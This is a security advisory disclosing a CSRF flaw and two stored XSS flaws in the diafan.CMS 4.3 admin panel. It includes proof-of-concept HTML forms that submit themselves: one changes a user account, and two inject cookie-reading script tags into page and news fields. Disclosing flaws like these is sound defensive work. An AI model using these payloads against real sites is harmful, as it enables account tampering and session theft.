@@ -1,0 +1,105 @@
+Vulnerability ID: HTB22777
+Reference: http://www.htbridge.ch/advisory/xsrf_csrf_in_diafan_cms.html
+Product: diafan.CMS
+Vendor: Diafan ( http://www.diafan.ru/ ) 
+Vulnerable Version: 4.3 and probably prior versions
+Vendor Notification: 28 December 2010 
+Vulnerability Type: CSRF (Cross-Site Request Forgery)
+Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
+Risk level: Low 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/) 
+
+CSRF:
+Vulnerability Details:
+The vulnerability exists due to failure in the "http://host/admin/usersite/save2/" script to properly verify the source of HTTP request.
+
+Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+Attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://host/admin/usersite/save2/" method="post" name="main" enctype="multipart/form-data" >
+
+<input type="hidden" name="noOut" value="1">
+<input type="hidden" name="save_post" value="1">
+<input type="hidden" name="id" value="2">
+<input type="hidden" name="fio" value="first name">
+<input type="hidden" name="name" value="userlogin">
+<input type="hidden" name="password" value="">
+<input type="hidden" name="mail" value="email@example.com">
+<input type="hidden" name="created" value="23.12.2010">
+<input type="hidden" name="act" value="1">
+<input type="hidden" name="moderator" value="1">
+<input type="hidden" name="language" value="">
+<input type="hidden" name="phone" value="phone">
+<input type="hidden" name="city" value="city">
+<input type="hidden" name="street" value="street">
+<input type="hidden" name="home" value="5">
+<input type="hidden" name="corps" value="">
+<input type="hidden" name="flat" value="98">
+
+</form>
+<script>
+document.main.submit();
+</script>
+
+XSS:
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+
+The vulnerability exists due to failure in the "http://host/admin/site/save2/" script to properly sanitize user-supplied input in "text" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+An attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://host/admin/site/save2/" method="post" name="main" enctype="multipart/form-data" >
+<input type="hidden" name="noOut" value="1">
+<input type="hidden" name="save_post" value="1">
+<input type="hidden" name="id" value="2">
+<input type="hidden" name="name" value="page name">
+<input type="hidden" name="act" value="1">
+<input type="hidden" name="actm" value="1">
+<input type="hidden" name="title_meta" value="title">
+<input type="hidden" name="keywords" value="">
+<input type="hidden" name="descr" value="">
+<input type="hidden" name="rewrite" value="sef_url">
+<input type="hidden" name="addmodule" value="">
+<input type="hidden" name="parent_id" value="">
+<input type="hidden" name="sort" value="2">
+<input type="hidden" name="theme" value="">
+<input type="hidden" name="othurl" value="">
+<input type="hidden" name="text" value='content html"><script>alert(document.cookie)</script>'>
+</form>
+<script>
+document.main.submit();
+</script>
+
+XSS:
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+
+The vulnerability exists due to failure in the "http://host/admin/news/saveNEWS_ID/" script to properly sanitize user-supplied input in "descr" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+An attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://host/admin/news/saveNEWS_ID/" method="post" name="main" enctype="multipart/form-data" >
+<input type="hidden" name="noOut" value="1">
+<input type="hidden" name="save_post" value="1">
+<input type="hidden" name="id" value="NEWS_ID">
+<input type="hidden" name="name" value="news name">
+<input type="hidden" name="created" value="23.12.2010 09:02">
+<input type="hidden" name="photo" value="">
+<input type="hidden" name="act" value="1">
+<input type="hidden" name="tag" value="">
+<input type="hidden" name="title_meta" value="">
+<input type="hidden" name="keywords" value="">
+<input type="hidden" name="descr" value='desc"><script>alert(document.cookie)</script>'>
+<input type="hidden" name="rewrite" value="">
+<input type="hidden" name="site_id" value="5">
+<input type="hidden" name="anons" value='announce'>
+<input type="hidden" name="text" value="news_text">
+</form>
+<script>
+document.main.submit();
+</script>
+
+
+
